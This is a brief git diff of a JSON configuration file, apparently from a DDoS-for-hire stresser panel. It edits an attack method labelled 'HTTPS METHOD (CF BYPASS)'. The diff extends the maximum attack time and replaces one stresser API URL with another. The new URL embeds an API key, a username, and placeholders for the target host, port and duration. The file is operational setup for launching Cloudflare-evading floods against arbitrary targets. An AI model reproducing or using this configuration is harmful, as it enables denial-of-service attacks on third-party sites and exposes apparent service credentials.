@@ -13,11 +13,11 @@
    },
 	{
 		"name":"HOME",
-		"time":200,
+		"time":900,
 		"description":"HTTPS METHOD (CF BYPASS)",
 		"permission":[],
 		"api":[
-			"https://scarstress.xyz/scar/api?key=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME"
+			"https://volity-api.to/client/api/home?key=lm7z07bbw8ygd60&username=xnvmn&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOME"
   
 		]
    },
